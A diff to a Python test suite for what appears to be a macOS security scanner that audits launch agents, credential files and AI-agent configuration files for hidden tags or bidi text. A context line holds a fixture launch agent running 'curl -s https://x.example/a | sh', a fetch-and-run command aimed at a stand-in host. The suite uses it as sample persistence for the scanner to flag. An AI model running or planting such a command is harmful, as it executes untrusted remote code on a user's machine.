@@ -118,12 +118,15 @@ class AutostartTest(Tmp):
             self.plist("com.example.tool.plist", {"Label": "com.example.tool", "ProgramArguments": [os.path.join(bin_dir, "tool")]})
             self.plist("com.example.sh.plist", {"Label": "com.example.sh", "ProgramArguments": ["/bin/sh", "-c", "curl -s https://x.example/a | sh"]})
             self.plist("com.example.nightly.plist", {"Label": "com.example.nightly", "ProgramArguments": ["/bin/zsh", "/Users/x/job.sh"]})
+            self.plist("com.google.GoogleUpdater.wake.plist", {"Label": "com.google.GoogleUpdater.wake",
+                                                               "ProgramArguments": [os.path.join(bin_dir, "gone", "GoogleUpdater")]})
             self.plist("homebrew.mxcl.redis.plist", {"Label": "homebrew.mxcl.redis", "ProgramArguments": ["/opt/homebrew/opt/redis/bin/redis-server"]})
             with FakeSignatures({"Keystone": GOOGLE, "bin/tool": ADHOC, "/bin/": APPLE}):
                 a = cx.autostart(["com.example.nightly"], ioc=cx.load_ioc(), dirs=((os.path.join(self.root, "LaunchAgents"), "user"),),
                                  app_dirs=())
             by = {x["label"]: set(x["flags"]) for x in a["items"]}
-            self.assertEqual(a["total"], 6)
+            self.assertEqual(a["total"], 7)
+            self.assertEqual(by["com.google.GoogleUpdater.wake"], {"missing"})   # leftover plist of a removed app: not a fake
             self.assertFalse(by["com.google.keystone.agent"] & {"fakeGoogle", "unsigned", "adhoc"})   # the real Google updater
             self.assertTrue({"fakeApple", "temp", "ioc"} <= by["com.apple.softwareupdated"])
             self.assertIn("adhoc", by["com.example.tool"])
@@ -249,7 +252,9 @@ class AiKeysTest(Tmp):
         self.write(".git-credentials", "https://me:ghp_secret@github.com\n", mode=0o600)
         self.write(".npmrc", "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n", mode=0o600)
         self.write(".codex/auth.json", "{}", mode=0o644)
+        self.write(".docker/config.json", '{"credsStore": "osxkeychain"}', mode=0o644)
         res = {c["kind"]: c for c in cx.cred_files(self.root)}
+        self.assertEqual((res["docker"]["private"], res["docker"]["plain"]), (False, False))
         self.assertEqual((res["git"]["plain"], res["git"]["private"]), (True, True))
         self.assertFalse(res["npm"]["plain"])                       # read from an environment variable: fine
         self.assertFalse(res["codex"]["private"])
@@ -320,7 +325,8 @@ def threat_facts(bad=True):
                           "hidden": [{"file": "~/work/app/CLAUDE.md", "kinds": ["tags"]}, {"file": "~/work/b/AGENTS.md", "kinds": ["bidi"]}],
                           "globalHooks": 2}
         f["aiKeys"] = {"credFiles": [{"file": "~/.git-credentials", "kind": "git", "private": True, "plain": True},
-                                     {"file": "~/.codex/auth.json", "kind": "codex", "private": False, "plain": None}],
+                                     {"file": "~/.codex/auth.json", "kind": "codex", "private": False, "plain": None},
+                                     {"file": "~/.docker/config.json", "kind": "docker", "private": False, "plain": False}],
                        "mcp": [{"app": "Claude Code", "source": "~/.claude.json", "name": "gh", "transport": "local", "unpinned": True,
                                 "insecureUrl": False, "secretValues": 1},
                                {"app": "Cursor", "source": "~/.cursor/mcp.json", "name": "remote", "transport": "remote", "unpinned": False,
@@ -359,6 +365,8 @@ class ThreatReportTest(unittest.TestCase):
         auto = [x for x in d["todo"] if x["cat"] == "autostart" and x["level"] == "red"][0]
         self.assertIn("com.apple.crashreporter.helper", auto["what"]["en"])
         self.assertNotIn("keystone", json.dumps(auto))           # the real Google updater is not named
+        keys_red = [x for x in d["todo"] if x["cat"] == "aikeys" and x["level"] == "red"][0]
+        self.assertNotIn("docker", json.dumps(keys_red))          # readable, but holds no key: not red
         self.assertIn("~/.zshrc:12", json.dumps(d, ensure_ascii=False))
         cats = {c["cat"] for c in d["checks"]}
         self.assertTrue(set(easy_report.THREAT_CATS) <= cats)
